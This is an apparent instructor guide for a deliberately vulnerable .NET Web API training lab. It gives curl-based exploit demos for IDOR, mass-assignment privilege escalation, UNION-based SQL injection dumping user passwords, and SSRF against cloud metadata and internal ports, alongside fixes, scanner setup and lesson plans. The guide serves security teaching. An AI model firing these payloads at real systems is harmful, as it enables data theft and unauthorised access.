# ?? Instructor Quick Reference
## Damn Vulnerable Web API - Training Lab Setup

---

## ?? Overview

This is a deliberately vulnerable .NET 8 Web API for security training. It demonstrates OWASP API Security Top 10 (2023) vulnerabilities and is designed to be scanned by SAST (SonarQube) and DAST (OWASP ZAP) tools.

**?? WARNING:** For educational use in isolated environments only!

---

## ?? Quick Start (5 minutes)

### Option 1: Docker (Recommended)
```bash
# Start everything
docker-compose up --build -d

# Access points:
# - API & Swagger: http://localhost:5000
# - Database Admin: http://localhost:8080 (user: postgres, pass: postgres123)
```

### Option 2: Local Development
```bash
# Start PostgreSQL
docker run -d --name postgres -e POSTGRES_PASSWORD=postgres123 -e POSTGRES_DB=vulnerabledb -p 5432:5432 postgres:16-alpine

# Run API
cd VulnerableAPI
dotnet run
```

---

## ?? Training Scenarios

### Scenario 1: BOLA/IDOR (15 minutes)
**Learning Objective:** Understand broken object-level authorization

**Demo Steps:**
```bash
# 1. Login as john (ID: 2)
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
-H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# 2. Access admin data (ID: 1) - should fail but doesn't!
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/user/1 | jq
```

**Key Teaching Points:**
- No resource ownership check
- Any authenticated user can access any resource
- Sensitive data exposure (credit cards, addresses)

**Fix Discussion:**
```csharp
// Add authorization check
var currentUserId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value);
if (id != currentUserId && !User.IsInRole("Admin"))
    return Forbid();
```

---

### Scenario 2: Mass Assignment (15 minutes)
**Learning Objective:** Understand property-level authorization

**Demo Steps:**
```bash
# 1. Login as john
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# 2. Escalate to admin
curl -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":2,"username":"john","email":"john@vulnerable.api","password":"12345","fullName":"John Admin","phoneNumber":"555","address":"123","isAdmin":true}'

# 3. Verify escalation
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/user/2 | jq '.isAdmin'
```

**Key Teaching Points:**
- Direct entity model binding
- No property-level access control
- Privilege escalation risk

**Fix Discussion:**
```csharp
// Use DTOs instead of entity models
public class UpdateUserDto
{
    public string FullName { get; set; }
    public string PhoneNumber { get; set; }
    // Don't expose IsAdmin
}
```

---

### Scenario 3: SQL Injection (20 minutes)
**Learning Objective:** Understand injection vulnerabilities

**Demo Steps:**
```bash
# 1. Basic injection
curl "http://localhost:5000/api/product/search?keyword=' OR '1'='1"

# 2. Union-based data extraction
curl "http://localhost:5000/api/product/search?keyword=' UNION SELECT id, username, password, email, 0, 0, 'HACKED', created_at FROM \"Users\"--"
```

**Key Teaching Points:**
- String concatenation in SQL
- FromSqlRaw with unsanitized input
- Data exfiltration techniques

**Fix Discussion:**
```csharp
// Use parameterized queries or LINQ
var products = await _context.Products
    .Where(p => p.Name.Contains(keyword))
    .ToListAsync();
```

---

### Scenario 4: SSRF (15 minutes)
**Learning Objective:** Understand server-side request forgery

**Demo Steps:**
```bash
# 1. Access internal API
curl "http://localhost:5000/api/utility/fetch-image?url=http://localhost:5000/api/user/1"

# 2. Cloud metadata access (demo concept)
curl "http://localhost:5000/api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/"

# 3. Port scanning
curl "http://localhost:5000/api/utility/fetch-image?url=http://192.168.1.1:22"
```

**Key Teaching Points:**
- Unvalidated URL parameters
- Internal network access
- Cloud metadata exposure

**Fix Discussion:**
```csharp
// URL whitelist validation
var allowedHosts = new[] { "cdn.trusted.com", "images.trusted.com" };
var uri = new Uri(url);
if (!allowedHosts.Contains(uri.Host))
  return BadRequest("URL not allowed");
```

---

### Scenario 5: Broken Authentication (15 minutes)
**Learning Objective:** Understand authentication weaknesses

**Demo Steps:**
```bash
# 1. Register with weak password
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"weak","password":"1","email":"w@test.com","fullName":"Weak"}'

# 2. Check logs for password exposure
docker logs vulnerable-api | grep -i password

# 3. Analyze JWT structure
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')
echo $TOKEN | cut -d '.' -f2 | base64 -d 2>/dev/null | jq
```

**Key Teaching Points:**
- Hardcoded secrets
- Weak password policy
- Plain text storage
- Sensitive data logging
- Long token expiration

---

## ?? SAST Configuration (SonarQube)

### Setup
```bash
# Install SonarQube (Docker)
docker run -d --name sonarqube -p 9000:9000 sonarqube:latest

# Install scanner
dotnet tool install --global dotnet-sonarscanner
```

### Run Analysis
```bash
cd VulnerableAPI

# Start analysis
dotnet sonarscanner begin \
  /k:"VulnerableAPI" \
  /d:sonar.host.url="http://localhost:9000" \
  /d:sonar.login="YOUR_TOKEN"

# Build
dotnet build

# End analysis
dotnet sonarscanner end /d:sonar.login="YOUR_TOKEN"
```

### Expected Results
| Rule ID | Vulnerability | Count |
|---------|---------------|-------|
| S2068 | Hardcoded credentials | 5+ |
| S3649 | SQL Injection | 3 |
| S5145 | Sensitive data logging | 4+ |
| S4507 | Debug features enabled | 1 |
| S5122 | CORS misconfiguration | 1 |

---

## ?? DAST Configuration (OWASP ZAP)

### GUI Method
1. **Start ZAP**
2. **Import OpenAPI:** `http://localhost:5000/swagger/v1/swagger.json`
3. **Configure context:** Set target to `http://localhost:5000`
4. **Authenticate:** Use john/12345
5. **Run Active Scan**

### CLI Method
```bash
# Pull ZAP Docker
docker pull zaproxy/zap-stable

# Run baseline scan
docker run --network host \
  zaproxy/zap-stable zap-baseline.py \
  -t http://localhost:5000 \
  -f openapi \
  -r zap-report.html
```

### Expected Alerts
| Alert | Risk | Count |
|-------|------|-------|
| SQL Injection | High | 3+ |
| SSRF | High | 3+ |
| Broken Access Control | High | 4+ |
| Information Disclosure | Medium | 5+ |
| CORS Misconfiguration | Medium | 1 |

---

## ?? Lab Exercise Template

### Exercise Structure (30-45 min per vulnerability)

1. **Introduction (5 min)**
   - Explain the vulnerability
   - Show OWASP reference
   - Discuss real-world impact

2. **Demonstration (10 min)**
   - Live demo of exploitation
   - Show the vulnerable code
   - Explain why it's vulnerable

3. **Hands-on Practice (15 min)**
   - Students exploit vulnerability
   - Document findings
   - Capture evidence

4. **Remediation (10 min)**
   - Discuss proper fix
   - Show secure code example
   - Best practices

5. **Discussion (5 min)**
   - Q&A
   - Related vulnerabilities
   - Defense in depth

---

## ?? Suggested Lab Sequence

### Day 1: Introduction & Authentication (4 hours)
1. **Setup & Overview** (30 min)
   - Environment setup
   - Tool familiarization
   - API exploration

2. **API2: Broken Authentication** (90 min)
   - Weak passwords
   - Hardcoded secrets
   - Sensitive logging
   - Token analysis

3. **Break** (15 min)

4. **API8: Security Misconfiguration** (75 min)
   - CORS issues
   - Error disclosure
 - Swagger exposure
   - Information leakage

### Day 2: Authorization & Injection (4 hours)
1. **API1: BOLA/IDOR** (90 min)
   - Identify endpoints
   - Test authorization
   - Data exfiltration
   - Fix implementation

2. **Break** (15 min)

3. **SQL Injection** (90 min)
   - Boolean-based
   - Union-based
   - Error-based
   - Remediation

4. **Wrap-up** (15 min)

### Day 3: Advanced Attacks (4 hours)
1. **API3: Mass Assignment** (60 min)
   - Property-level authorization
   - Privilege escalation
   - DTO pattern

2. **API7: SSRF** (60 min)
   - Internal access
   - Cloud metadata
- URL validation

3. **Break** (15 min)

4. **Tool Integration** (75 min)
   - SonarQube analysis
   - OWASP ZAP scan
   - Report generation

5. **Final Assessment** (30 min)

---

## ?? Assessment Ideas

### Quiz Questions
1. What is BOLA/IDOR and how does it differ from privilege escalation?
2. Why is storing passwords in plain text dangerous?
3. What makes a JWT secret key secure?
4. How does parameterized query prevent SQL injection?
5. What is the difference between SAST and DAST?

### Practical Tasks
1. Find and exploit all IDOR vulnerabilities
2. Escalate privileges from regular user to admin
3. Extract all user passwords using SQL injection
4. Access internal services using SSRF
5. Write remediation code for one vulnerability

### Capture-the-Flag Style
- **Flag 1:** Admin's credit card number (BOLA)
- **Flag 2:** JWT secret key (Code review/logs)
- **Flag 3:** Database password (SQL Injection)
- **Flag 4:** Internal service response (SSRF)
- **Flag 5:** Hidden user account (SQL Injection)

---

## ??? Troubleshooting

### Database Connection Issues
```bash
# Check PostgreSQL is running
docker ps | grep postgres

# Check connection string
docker logs vulnerable-api | grep -i "connection"

# Restart database
docker-compose restart postgres
```

### API Not Responding
```bash
# Check API logs
docker logs vulnerable-api

# Check port availability
netstat -an | grep 5000

# Rebuild
docker-compose down -v
docker-compose up --build
```

### No Vulnerabilities Detected
- Ensure using vulnerable version (not fixed)
- Check scanner configuration
- Verify authentication works
- Review scanner logs

---

## ?? Additional Resources

### For Instructors
- [OWASP API Security Project](https://owasp.org/www-project-api-security/)
- [API Security Best Practices](https://github.com/shieldfy/API-Security-Checklist)
- [Web Security Academy](https://portswigger.net/web-security)

### For Students
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [HackTricks](https://book.hacktricks.xyz/)

### Tools Documentation
- [SonarQube Docs](https://docs.sonarqube.org/)
- [OWASP ZAP Docs](https://www.zaproxy.org/docs/)
- [Burp Suite](https://portswigger.net/burp/documentation)

---

## ?? Support

For issues or questions:
1. Check TESTING_GUIDE.md
2. Review VULNERABILITY_MATRIX.md
3. Check Docker logs
4. Review README.md

---

## ?? Legal & Ethical

**Important Reminders for Students:**
- Use only in authorized environments
- Do not test on production systems
- Do not test on systems you don't own
- Follow responsible disclosure
- Understand local laws

---

## ?? Demo Script

### 5-Minute Lightning Demo
```bash
# 1. Show API is running
curl http://localhost:5000/api/utility/health

# 2. BOLA Demo
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

echo "John accessing Admin's credit card:"
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/1 | jq '.creditCardNumber'

# 3. SQL Injection Demo
echo "SQL Injection extracting passwords:"
curl "http://localhost:5000/api/product/search?keyword=' UNION SELECT id, username, password, email, 0, 0, 'x', created_at FROM \"Users\"--" | jq

# 4. Mass Assignment Demo
echo "Regular user becoming admin:"
curl -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":2,"username":"john","email":"john@test.com","password":"12345","fullName":"John","phoneNumber":"555","address":"x","isAdmin":true}' | jq '.isAdmin'
```

---

This quick reference provides everything you need to run an effective security training session!
